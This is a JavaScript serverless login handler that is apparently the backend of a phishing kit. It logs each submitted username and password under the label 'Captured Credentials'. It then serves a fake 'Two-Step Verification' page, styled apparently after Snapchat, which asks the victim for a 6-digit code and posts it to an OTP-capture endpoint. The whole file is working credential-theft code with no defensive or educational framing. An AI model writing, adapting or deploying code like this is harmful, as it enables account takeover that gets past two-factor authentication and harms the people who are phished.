// api/login.js

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  try {
    const { username, password } = req.body;

    // Log the first set of credentials
    console.log(`STEP 1 - Captured Credentials - Username: ${username}, Password: ${password}`);

    // Send back an HTML page for the OTP entry
    res.setHeader('Content-Type', 'text/html');
    res.send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Two-Step Verification</title>
          <style>
              body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
              .container { text-align: center; padding: 40px; border: 1px solid #ddd; border-radius: 8px; width: 350px; }
              h2 { color: #333; }
              p { color: #666; }
              input[type="text"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
              button { background-color: #fffc00; color: #000; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; }
              button:hover { background-color: #f0e800; }
          </style>
      </head>
      <body>
          <div class="container">
              <h2>Two-Step Verification</h2>
              <p>For your security, enter the 6-digit code we sent to your device.</p>
              <form action="/api/verify-otp" method="POST">
                  <input type="text" name="otp" placeholder="Enter 6-digit code" maxlength="6" required>
                  <button type="submit">Verify</button>
              </form>
          </div>
      </body>
      </html>
    `);

  } catch (error) {
    console.error('Error in login function:', error);
    res.status(500).send('Internal Server Error');
  }
}
